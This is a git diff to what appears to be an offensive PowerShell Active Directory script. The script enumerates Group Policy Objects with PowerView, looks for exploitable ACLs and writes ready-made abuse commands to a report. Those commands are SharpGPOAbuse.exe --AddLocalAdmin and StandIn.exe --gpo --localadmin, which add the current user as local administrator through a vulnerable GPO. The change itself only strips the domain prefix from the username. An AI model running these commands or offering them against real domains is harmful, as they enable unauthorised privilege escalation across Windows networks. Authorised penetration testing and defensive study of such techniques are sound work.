@@ -96,6 +96,7 @@ Get-DomainGroup -Properties Name, Description | Where-Object { $_.Name -match $v
 Write-Host "[>] Checking GPO Exploits (ACLs)..." -ForegroundColor Cyan
 write-section "GPO EXPLOITABILITY"
 $gpos = Get-DomainGPO
+# Mengambil samAccountName saja (menghapus "domain\")
 $me = whoami
 $foundExploit = $false
 $exploitableGPONames = @() # Untuk menampung nama GPO yang kena hit
@@ -146,7 +147,7 @@ if ($foundExploit) {
         Add-Content $outfile "    Option A - SharpGPOAbuse"
         # Menggunakan singel quote agar nama GPO dengan spasi tidak error
         Add-Content $outfile "    ./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount $me --GPOName '$targetGPO'"
-        
+        $me = (whoami).Split('\')[-1]
         Add-Content $outfile "    Option B - StandIn"
         Add-Content $outfile "    ./StandIn.exe --gpo --filter '$targetGPO' --localadmin $me"
     }
